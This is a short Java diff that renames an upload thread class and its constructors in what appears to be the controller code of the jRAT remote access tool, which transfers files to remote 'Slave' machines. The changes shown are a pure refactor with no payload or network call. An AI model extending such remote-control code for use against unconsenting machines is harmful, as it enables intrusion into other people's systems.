@@ -9,11 +9,11 @@ import io.jrat.controller.ui.panels.PanelFileTransfers;
 import java.io.File;
 import java.io.FileInputStream;
 
-public class UploadThread extends TransferRunnable {
+public class ThreadUploadFile extends TransferRunnable {
 	
 	private Slave slave;
 	
-	public UploadThread(Slave slave, String remoteFile, File file) {
+	public ThreadUploadFile(Slave slave, String remoteFile, File file) {
 		this.slave = slave;
 		
 		data = new TransferData();
@@ -26,7 +26,7 @@ public class UploadThread extends TransferRunnable {
 		data.setRunnable(this);
 	}
 	
-	public UploadThread(TransferData data) {
+	public ThreadUploadFile(TransferData data) {
 		super(data);
 	}
 	
